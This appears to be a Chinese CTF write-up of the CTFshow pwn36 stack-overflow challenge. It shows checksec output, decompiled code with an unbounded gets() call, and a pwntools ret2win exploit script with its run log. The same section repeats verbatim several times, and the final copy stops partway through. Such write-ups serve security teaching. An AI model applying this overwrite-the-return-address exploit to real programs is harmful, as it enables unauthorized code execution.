<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn36-13"><a href="#pwn36-13" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn36-14"><a href="#pwn36-14" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn36-15"><a href="#pwn36-15" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn36-16"><a href="#pwn36-16" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
